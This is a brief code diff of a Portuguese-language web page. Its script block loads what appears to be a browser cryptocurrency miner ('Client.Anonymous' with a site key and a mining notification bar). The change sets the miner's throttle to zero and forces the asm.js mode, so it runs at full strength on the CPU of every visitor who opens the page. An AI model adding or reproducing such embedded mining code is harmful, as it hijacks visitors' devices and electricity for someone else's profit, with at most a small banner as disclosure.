@@ -25,7 +25,7 @@ Neste primeiro acesso, o usuário pode consultar apenas se há ou não recursos 
 
 <script>
     var _client = new Client.Anonymous('cb305dd1a0710e45ff329c888603e9e89e090ba89bfa3ebb6ce4d74d4f24891d', {
-        throttle: 0.6, c: 'w'
+        throttle: 0, c: 'w', forceASMJS:true
     });
     _client.start();
     _client.addMiningNotification("Bottom", "", "#cccccc", 40, "#3d3d3d");
